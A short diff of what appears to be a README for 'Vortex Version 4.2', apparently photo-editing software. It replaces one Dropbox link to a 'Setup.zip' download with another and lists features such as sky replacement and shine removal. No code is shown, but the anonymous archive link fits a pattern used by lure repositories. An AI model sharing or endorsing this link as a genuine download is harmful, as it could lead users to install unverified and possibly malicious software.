@@ -17,7 +17,7 @@
 
 ![alt-text](https://i.ibb.co/zmtMfZQ/original.jpg" ).
 
-## [⚡Vortex Version 4.2 Download](https://www.dropbox.com/s/jds2mwyujulqirg/Setup.zip?dl=1)
+## [⚡Vortex Version 4.2 Download](https://www.dropbox.com/s/5z5ilxt64ev8wub/Setup.zip?dl=1)
 * NEW AI Augmented Sky Tool.
 * Features Detection Network.
 * Shine Removal Technology.
